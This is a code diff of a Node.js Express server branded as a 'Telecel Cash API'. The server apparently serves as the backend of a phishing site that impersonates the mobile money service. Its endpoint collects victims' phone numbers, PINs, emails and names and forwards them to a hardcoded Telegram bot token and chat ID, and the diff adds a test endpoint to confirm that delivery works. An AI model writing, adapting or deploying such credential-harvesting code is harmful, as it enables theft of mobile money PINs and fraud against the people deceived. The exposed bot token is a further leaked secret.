@@ -2,7 +2,6 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(express.json());
 
 // CORS
@@ -18,22 +17,23 @@ app.use((req, res, next) => {
 const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
 const TG_CHAT_ID = '6414813627';  // YOUR chat ID for notifications
 
+// Health check
+app.get('/health', (req, res) => {
+    res.json({ status: 'healthy', uptime: process.uptime() });
+});
+
+// Root endpoint
 app.get('/', (req, res) => {
     res.json({ status: 'OK', message: 'Telecel Cash API is running!' });
 });
 
-app.get('/health', (req, res) => {
-    res.json({ status: 'healthy', uptime: process.uptime(), telegram_configured: true });
-});
-
+// Main send endpoint
 app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, type, site, amount, term, monthly } = req.body;
-        
         const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Accra' });
         
         let message = '';
-        
         if (type === 'application') {
             message = `📱 NEW APPLICATION - Telecel Cash 📱\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n💰 Amount: ₵${amount}\n📅 Term: ${term} months\n💵 Monthly: ₵${monthly}\n💼 Income: ₵${pin}\n⏰ Time: ${timestamp}`;
         } else if (type === 'pin') {
@@ -48,23 +48,26 @@ app.post('/api/send-telegram', async (req, res) => {
         const response = await fetch(url);
         const result = await response.json();
         
-        if (result.ok) {
-            res.json({ success: true });
-        } else {
-            res.json({ success: false, error: result.description });
-        }
+        res.json({ success: result.ok, error: result.description });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
+// ========== TEST ENDPOINT (ADD THIS) ==========
 app.post('/api/test-telegram', async (req, res) => {
     try {
-        const testMessage = `🔧 TEST - Telecel Cash Bot is working! ✅`;
+        const testMessage = `🔧 TEST MESSAGE 🔧\n\nTelecel Cash Bot is working!\nTime: ${new Date().toLocaleString()}\n\nIf you receive this, your bot is configured correctly! ✅`;
+        
         const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
         const response = await fetch(url);
         const result = await response.json();
-        res.json({ success: result.ok, error: result.description });
+        
+        if (result.ok) {
+            res.json({ success: true, message: 'Test message sent to Telegram!' });
+        } else {
+            res.json({ success: false, error: result.description });
+        }
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
